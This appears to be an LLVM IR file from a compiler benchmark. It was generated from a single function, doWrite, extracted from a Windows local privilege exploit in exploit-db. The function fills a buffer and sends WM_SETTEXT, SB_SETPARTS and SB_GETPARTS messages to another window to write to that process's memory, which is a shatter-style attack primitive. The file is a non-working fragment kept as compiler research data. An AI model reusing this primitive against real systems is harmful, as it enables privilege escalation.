; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_21686.c_doWrite.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_21686.c_doWrite.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@mainhWnd = common dso_local global i32 0, align 4
@WM_SETTEXT = common dso_local global i64 0, align 8
@SB_SETPARTS = common dso_local global i64 0, align 8
@heapaddr = common dso_local global i64 0, align 8
@SB_GETPARTS = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @doWrite(i32 %0, i64 %1, i64 %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  %6 = alloca i64, align 8
  %7 = alloca [5000 x i8], align 16
  store i32 %0, i32* %4, align 4
  store i64 %1, i64* %5, align 8
  store i64 %2, i64* %6, align 8
  %8 = getelementptr inbounds [5000 x i8], [5000 x i8]* %7, i64 0, i64 0
  %9 = call i32 @memset(i8* %8, i64 0, i32 5000)
  %10 = getelementptr inbounds [5000 x i8], [5000 x i8]* %7, i64 0, i64 0
  %11 = load i64, i64* %5, align 8
  %12 = call i32 @memset(i8* %10, i64 %11, i32 4999)
  %13 = load i32, i32* @mainhWnd, align 4
  %14 = load i64, i64* @WM_SETTEXT, align 8
  %15 = trunc i64 %14 to i32
  %16 = call i32 (i32, i32, i32, ...) @SendMessage(i32 %13, i32 %15, i32 0, [5000 x i8]* %7)
  %17 = load i32, i32* %4, align 4
  %18 = load i64, i64* @SB_SETPARTS, align 8
  %19 = trunc i64 %18 to i32
  %20 = load i64, i64* @heapaddr, align 8
  %21 = call i32 (i32, i32, i32, ...) @SendMessage(i32 %17, i32 %19, i32 1, i64 %20)
  %22 = load i32, i32* %4, align 4
  %23 = load i64, i64* @SB_GETPARTS, align 8
  %24 = trunc i64 %23 to i32
  %25 = load i64, i64* %6, align 8
  %26 = call i32 (i32, i32, i32, ...) @SendMessage(i32 %22, i32 %24, i32 1, i64 %25)
  ret void
}

declare dso_local i32 @memset(i8*, i64, i32) #1

declare dso_local i32 @SendMessage(i32, i32, i32, ...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
